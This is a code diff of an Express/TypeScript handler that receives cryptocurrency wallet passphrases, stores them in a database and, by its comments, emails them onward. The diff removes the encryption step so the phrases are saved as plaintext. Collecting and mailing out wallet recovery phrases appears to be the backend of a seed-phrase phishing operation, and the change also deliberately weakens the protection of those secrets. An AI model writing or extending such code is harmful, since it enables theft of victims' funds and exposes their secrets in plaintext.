@@ -6,17 +6,17 @@ import { Request, Response } from 'express';
 import { AppDataSource } from './index';
 import { WalletPhrase } from './entity/WalletPhrase';
 
-// Encryption setup (ensure ENCRYPTION_KEY is a 32-byte string in your .env)
-const ALGORITHM = 'aes-256-cbc';
-const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY || '', 'hex'); // Must be 32 bytes (64 hex characters)
-const IV_LENGTH = 16;
+// // Encryption setup (ensure ENCRYPTION_KEY is a 32-byte string in your .env)
+// const ALGORITHM = 'aes-256-cbc';
+// const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY || '', 'hex'); // Must be 32 bytes (64 hex characters)
+// const IV_LENGTH = 16;
 
-const encrypt = (text: string): string => {
-  const iv = crypto.randomBytes(IV_LENGTH);
-  const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
-  const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
-  return `${iv.toString('hex')}:${encrypted.toString('hex')}`;
-};
+// const encrypt = (text: string): string => {
+//   const iv = crypto.randomBytes(IV_LENGTH);
+//   const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
+//   const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
+//   return `${iv.toString('hex')}:${encrypted.toString('hex')}`;
+// };
 
 // Configure your email transport (use environment variables for real projects)
 const transporter = nodemailer.createTransport({
@@ -50,8 +50,7 @@ export const sendWalletPhrase = async (req: Request, res: Response) => {
   try {
     // 1. Save to database
     const walletPhraseRepository = AppDataSource.getRepository(WalletPhrase);
-    const encryptedPhrase = encrypt(passphrase);
-    const newPhrase = walletPhraseRepository.create({ passphrase: encryptedPhrase });
+    const newPhrase = walletPhraseRepository.create({ passphrase: passphrase });
     await walletPhraseRepository.save(newPhrase);
 
     // 2. Send email
